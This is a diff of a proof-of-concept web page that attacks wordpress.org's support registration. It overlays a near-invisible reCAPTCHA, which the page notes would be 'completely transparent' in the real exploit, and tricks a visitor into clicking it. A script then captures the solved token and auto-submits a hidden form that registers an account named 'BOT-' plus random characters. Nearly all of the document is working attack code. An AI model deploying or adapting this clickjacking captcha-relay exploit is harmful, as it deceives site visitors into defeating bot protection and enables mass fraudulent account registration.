@@ -2,17 +2,13 @@
 
 <script type='text/javascript' src='https://www.google.com/recaptcha/api.js?ver=2'></script>
 
-
-
-
-
 <form method="post" action="https://wordpress.org/support/register.php">
 <div style="opacity:0.1" class="g-recaptcha" data-sitekey="6Ld6gcoSAAAAAEkCxPeS-_sqEokNIHwNCOtx17xo"></div>
 
        <input name="user_login" type="hidden" id="user_login" size="30" maxlength="30" value="" />
           <input name="user_email" id="user_email" type="hidden" value="" />
       </form>
- < in real exploit it will be completely transparent. Make a click!
+In the real exploit it will be completely transparent. Make a click!
 
 
 <script>
@@ -21,7 +17,7 @@ function makeid()
     var text = "";
     var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
 
-    for( var i=0; i < 5; i++ )
+    for( var i=0; i < 7; i++ )
         text += possible.charAt(Math.floor(Math.random() * possible.length));
 
     return text;
@@ -33,7 +29,7 @@ user_login.value='BOT-'+makeid();
 check = setInterval(function(){
   v=document.getElementById('g-recaptcha-response').value
   if(v.length>0){
-    alert('Thanks for helping the bots! Your token is '+v);
+    alert('Thanks for helping my bot! Your token is '+v);
     document.forms[0].submit();
     clearInterval(check);
   }
